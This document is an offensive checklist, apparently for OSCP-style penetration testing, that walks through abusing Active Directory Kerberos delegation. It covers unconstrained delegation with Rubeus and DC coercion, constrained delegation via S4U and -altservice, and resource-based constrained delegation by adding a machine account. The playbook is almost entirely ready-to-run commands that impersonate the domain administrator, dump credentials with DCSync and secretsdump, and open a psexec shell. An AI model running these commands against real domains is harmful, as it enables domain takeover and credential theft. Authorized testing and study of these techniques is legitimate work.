# AD delegation

## Before I start
sudo ntpdate <DCIP>
- [ ] A ticket below wants host names, not IPs: <DCHost> and the target's FQDN resolve
At the pwn-broker prompt: tool install impacket, tool install netexec and tool install bloodyad.
- [ ] findDelegation reads the three kinds at once
impacket-findDelegation '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
nxc ldap <DCIP> -u '<Username>' -p '<Password>' --trusted-for-delegation

## Unconstrained: a host that keeps every TGT sent to it
- [ ] Not on the OSCP exam: the coercion steps here are kept out as a safe reading; OffSec's pages do not name coercion
- [ ] I own a host flagged TRUSTED_FOR_DELEGATION: coerce a DC to it and keep the DC's TGT
At the pwn-broker prompt:
tool install rubeus
serve
serve files rubeus
- [ ] Rubeus.exe fetched on the host I own with the line serve files gives
.\Rubeus.exe monitor /interval:5 /nowrap
- [ ] Coerce a DC to authenticate to that host: :Pb responder, the coerce_plus module, with LISTENER=<Hostname>.<Domain>, not <LHOST>
.\Rubeus.exe ptt /ticket:THE-BASE64
- [ ] The DC's TGT loaded: DCSync is next, :Pb dcsync

## Constrained: a service that may delegate to named SPNs
- [ ] findDelegation lists the SPNs in msDS-AllowedToDelegateTo for the account I hold
- [ ] S4U gets a ticket to one of them as any user I name, here the domain administrator
impacket-getST -spn 'cifs/<DCHost>' -impersonate administrator '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
impacket-getST -spn 'cifs/<DCHost>' -impersonate administrator '<Domain>/<Username>' -hashes ':<Hash>' -dc-ip <DCIP>
- [ ] Only protocol transition (TrustedToAuthForDelegation) lets me name a user with no ticket of theirs
- [ ] The granted service is not fixed: -altservice swaps the class on the same host, cifs for ldap
impacket-getST -spn 'cifs/<DCHost>' -altservice 'ldap/<DCHost>' -impersonate administrator '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
export KRB5CCNAME=THE-CCACHE
impacket-secretsdump -k -no-pass '<Domain>/administrator@<DCHost>'

## Resource-based: I can write msDS-AllowedToActOnBehalfOfOtherIdentity
- [ ] GenericWrite or GenericAll over <Computer>, from :Pb acl-abuse
- [ ] A machine account to delegate from: the quota is 10 by default, so I make my own
nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M maq
impacket-addcomputer '<Domain>/<Username>:<Password>' -computer-name 'ATTACK$' -computer-pass 'Pwned123!' -dc-ip <DCIP>
impacket-rbcd '<Domain>/<Username>:<Password>' -delegate-from 'ATTACK$' -delegate-to '<Computer>' -action write -dc-ip <DCIP>
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' add rbcd '<Computer>' 'ATTACK$'
impacket-getST -spn 'cifs/<Hostname>.<Domain>' -impersonate administrator '<Domain>/ATTACK$:Pwned123!' -dc-ip <DCIP>
export KRB5CCNAME=THE-CCACHE
impacket-psexec -k -no-pass '<Domain>/administrator@<Hostname>.<Domain>'

## From a Windows shell
.\Rubeus.exe s4u /user:ATTACK$ /rc4:THE-NT-HASH /impersonateuser:administrator /msdsspn:cifs/<Hostname>.<Domain> /ptt
- [ ] /rc4 is the NT hash of the account that holds the delegation right

## Clean up and next
impacket-rbcd '<Domain>/<Username>:<Password>' -delegate-from 'ATTACK$' -delegate-to '<Computer>' -action remove -dc-ip <DCIP>
- [ ] The ATTACK$ account I added noted for the report; with its RBCD gone it holds nothing
- [ ] A Kerberos error on use usually means I passed an IP or the clock slipped: an FQDN, then ntpdate
- [ ] Administrator reached on the target, tried everywhere else: :Pb lateral-movement
